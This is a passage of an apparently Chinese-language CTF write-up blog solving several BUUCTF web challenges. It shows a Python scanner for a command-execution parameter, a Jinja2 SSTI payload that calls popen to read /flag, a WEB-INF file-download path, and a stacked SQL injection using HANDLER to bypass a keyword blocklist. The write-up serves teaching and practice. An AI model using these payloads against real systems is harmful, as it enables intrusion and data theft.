punctuation\">.</span>encoding <span class=\"token operator\">=</span> <span class=\"token string\">'utf-8'</span>\n        content <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>text\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"A1andNS\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> gets<span class=\"token punctuation\">:</span>\n                r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">\"?&#123;0&#125;=\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"echo 'A1andNS';\"</span><span class=\"token punctuation\">)</span>\n                content <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>text\n                r<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token string\">\"A1andNS\"</span> <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">:</span>\n                    flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n                    <span class=\"token keyword\">break</span>\n            <span class=\"token keyword\">if</span> flag <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> posts<span class=\"token punctuation\">:</span>\n                    r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">:</span> <span class=\"token string\">\"echo 'A1andNS';\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n                    content <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>text\n                    r<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token string\">\"A1andNS\"</span> <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">break</span>\n            <span class=\"token keyword\">if</span> flag <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                param <span class=\"token operator\">=</span> i\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                param <span class=\"token operator\">=</span> b\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'找到了利用文件:    '</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">file</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"    而且利用参数为: &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'结束时间:    '</span> <span class=\"token operator\">+</span> time<span class=\"token punctuation\">.</span>asctime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        s1<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span>\n    t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>get_content<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025183319576.png\" alt=\"image-20201025183319576\"></p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;a44b5a78-c4a1-41d8-bb5f-9e9fe6dadd2e.node3.buuoj.cn&#x2F;xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025183606684.png\" alt=\"image-20201025183606684\"></p>\n<h2 id=\"BJDCTF-2nd-fake-google\"><a href=\"#BJDCTF-2nd-fake-google\" class=\"headerlink\" title=\"[BJDCTF 2nd]fake google\"></a>[BJDCTF 2nd]fake google</h2><p>考点：ssti</p>\n<p>随便输入，发现是get类型传入的东西会回显出来，第一时间想到了ssti。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>找到了一个可以利用的类os._wrap_close</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025184455053.png\" alt=\"image-20201025184455053\"></p>\n<p>写个脚本跑一下就可以找到os._wrap_close的位置了，是117</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">name&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025190151364.png\" alt=\"image-20201025190151364\"></p>\n<p>这和巅峰极客flask的那题的做法几乎是完全一样</p>\n<h2 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h2><p>考点：WEB-INF目录泄露</p>\n<p>上来就是一个登录界面，看一下help是什么，给出了一个java报错。</p>\n<p><code>java.io.FileNotFoundException:&#123;help.docx&#125;</code>文件没有找到。</p>\n<p>但是看到了url后，我怀疑存在任意文件下载,既然是java，这里要去看看WEB-INF/web.xml文件是否可以读取。这里有个坑，要用POST请求才能访问内容：</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>web-app</span> <span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4.0<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xmlns.jcp.org/xml/ns/javaee<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>welcome-file-list</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>welcome-file</span><span class=\"token punctuation\">></span></span>Index<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>welcome-file</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>welcome-file-list</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>IndexController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">></span></span>com.wm.ctf.IndexController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>IndexController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">></span></span>/Index<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>LoginController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">></span></span>com.wm.ctf.LoginController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>LoginController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">></span></span>/Login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>DownloadController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">></span></span>com.wm.ctf.DownloadController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>DownloadController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">></span></span>/Download<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>FlagController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-class</span><span class=\"token punctuation\">></span></span>com.wm.ctf.FlagController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-class</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet</span><span class=\"token punctuation\">></span></span>\n\n\n-<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>servlet-name</span><span class=\"token punctuation\">></span></span>FlagController<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-name</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url-pattern</span><span class=\"token punctuation\">></span></span>/Flag<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url-pattern</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>servlet-mapping</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>web-app</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里可以看到四个路由，一个是/Index,/Login,/Download,/Flag</p>\n<p>这里也可以看到关键的路径所在，例如com.wm.ctf.FlagController</p>\n<p>直接访问Flag路由是会报错的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025193202491.png\" alt=\"image-20201025193202491\"></p>\n<p>java接触的太少了，赶紧普及一下知识</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>WEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 </p>\n<p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </p>\n<p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 </p>\n<p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p>\n<p>/WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p></blockquote>\n<p>结合上面泄露的flag文件的路径信息，和上面这个WEB-INF/classes/的知识点。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用IDEA反编译打开class文件</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//</span>\n<span class=\"token comment\">// Source code recreated from a .class file by IntelliJ IDEA</span>\n<span class=\"token comment\">// (powered by FernFlower decompiler)</span>\n<span class=\"token comment\">//</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PrintWriter</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">WebServlet</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServlet</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">\"FlagController\"</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FlagController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">String</span> flag <span class=\"token operator\">=</span> <span class=\"token string\">\"ZmxhZ3s2NWFhMjA0NS1hMGVhLTQ3ZGEtYTJhYi03YTViNDA2YmIxOWZ9Cg==\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">FlagController</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> var1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> var2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">PrintWriter</span> var3 <span class=\"token operator\">=</span> var2<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        var3<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;h1>Flag is nearby ~ Come on! ! !&lt;/h1>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到了flag是base64的，解base64得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025194504849.png\" alt=\"image-20201025194504849\"></p>\n<h2 id=\"GYCTF2020-Blacklist\"><a href=\"#GYCTF2020-Blacklist\" class=\"headerlink\" title=\"[GYCTF2020]Blacklist\"></a>[GYCTF2020]Blacklist</h2><p>考点：sql注入、堆叠注入</p>\n<p>#被过滤了，可以用%23替代，经过测试数据库列数为2</p>\n<p>想要联合注入，得到一个直接回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上面这些都被过滤了，用堆叠注入，这个和强网杯2019的随便注类似</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025200216525.png\" alt=\"image-20201025200044222\"></p>\n<p>看到supersqli库</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025200216525.png\" alt=\"image-20201025200216525\"></p>\n<p>看到一个FlagHere表</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmohTJ.png\" alt=\"image 20201025200500629\"></p>\n<p>发现flag列，payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">inject&#x3D;-1&#39;;handler FlagHere open;handler FlagHere read first;%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmoztA.png\" alt=\"image 20201025200721336\"></p>\n<h2 id=\"BUUCTF-2018-Online-Tool\"><a href=\"#BUUCTF-2018-Online-Tool\" class=\"headerlink\" title=\"[BUUCTF 2018]Online Tool\"></a>[BUUCTF 2018]Online Tool</h2><p>考点：代码审计</p>\n<p>上来给源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glzjin\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token 